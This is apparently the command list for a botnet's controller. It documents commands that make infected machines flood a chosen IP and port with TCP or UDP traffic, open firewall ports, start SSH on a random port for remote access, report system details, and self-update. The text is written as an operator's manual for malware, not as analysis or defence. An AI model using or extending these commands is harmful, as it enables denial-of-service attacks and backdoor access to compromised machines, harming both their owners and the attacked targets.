List of commands

.die [ip]
	Orders bots to die.

	Parameters:
		ips - Only the bots matchings any of these IPs will answer (OPTIONAL)

.flood <type> <target> <port> <number> [string] 
	Floods a target with the specified attack.

	Parameters:
		type - tcp/udp/tcp-timed/udp-timed
		target - The target's IP or DNS name
		port - An integer representing the target's port
		number - The number of packets to sent. If the specified attack ends with "-timed", 
				 then it is the duration in seconds of the attack
		string - A string to send during the attack. Defaults to "X" (OPTIONAL)

.fw <ips> <action> <port>
	Do firewall operations.

	Parameters:
		ip - Only the bot matchings this IP will answer
		action - Currently, only "open" is allowed
		port - The port on which the action will be taken

.sshd <ips>
	Starts a SSH session on a random port (from 8000 to 65000) and open it.

	Parameters:
		ips - Only the bots matchings any of these IPs will answer

.sysinfo [ips]
	Orders bots to fetch system information, named hostname, kernel, public ip, platform, architeture and build time. 
	
	Parameters:
		ips - Only the bots matchings any of these IPs will answer (OPTIONAL)
	
.update [ips]
	Orders bots to fetch latest version and restart. (WARNING: the bot may fail to restart)
	
	Parameters:
		ips - Only the bots matchings any of these IPs will answer (OPTIONAL)

.version [ips]
	Returns bots versions. 
	
	Parameters:
		ips - Only the bots matchings any of these IPs will answer (OPTIONAL)
